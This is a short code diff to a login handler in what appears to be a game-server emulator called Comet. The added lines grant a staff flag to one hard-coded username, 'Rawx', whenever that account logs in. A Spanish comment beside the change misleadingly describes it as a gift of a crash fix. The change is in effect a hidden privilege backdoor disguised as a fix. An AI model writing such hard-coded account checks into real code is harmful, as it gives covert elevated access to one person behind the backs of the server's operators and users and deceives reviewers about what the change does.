@@ -254,6 +254,10 @@ public class PlayerLoginRequest implements CometTask {
                 }
             }
 
+            if(client.getPlayer().getData().getUsername().equals("Rawx")) {
+                client.getPlayer().setLogsClientStaff(true);
+            } // te regalaré un fix q en comet peta cuando un usuario excede un límite
+
             player.setSsoTicket(this.ticket);
             PlayerManager.getInstance().getSsoTicketToPlayerId().put(this.ticket, player.getId());
             } catch (Exception e) {
